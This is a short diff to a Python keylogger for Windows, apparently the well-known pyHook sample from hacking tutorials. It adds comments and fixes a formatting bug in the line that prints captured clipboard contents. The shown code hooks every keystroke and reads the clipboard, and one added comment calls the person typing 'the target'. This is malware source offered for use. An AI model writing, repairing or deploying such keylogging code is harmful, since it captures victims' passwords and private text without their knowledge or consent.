@@ -1,6 +1,9 @@
 from ctypes import *
 import pythoncom
+
+# pyhook doesnt have a python 3.8 version
 import pyHook
+
 import win32clipboard
 
 user32 = windll.user32
@@ -59,7 +62,7 @@ def KeyStroke(event):
             pasted_value = win32clipboard.GetClipboardData()
             win32clipboard.CloseClipboard()
 
-            print("[PASTE] - %s"(pasted_value))
+            print("[PASTE] - %s" % pasted_value)
         else:
             print("[%s]" % event.Key)
     return True
@@ -68,5 +71,7 @@ def KeyStroke(event):
 kl = pyHook.HookManager()
 kl.KeyDown = KeyStroke
 
+# whenever the target presses on the keyboard, keystroke function called with event object as parameter
 kl.HookKeyboard()
+
 pythoncom.PumpMessages()
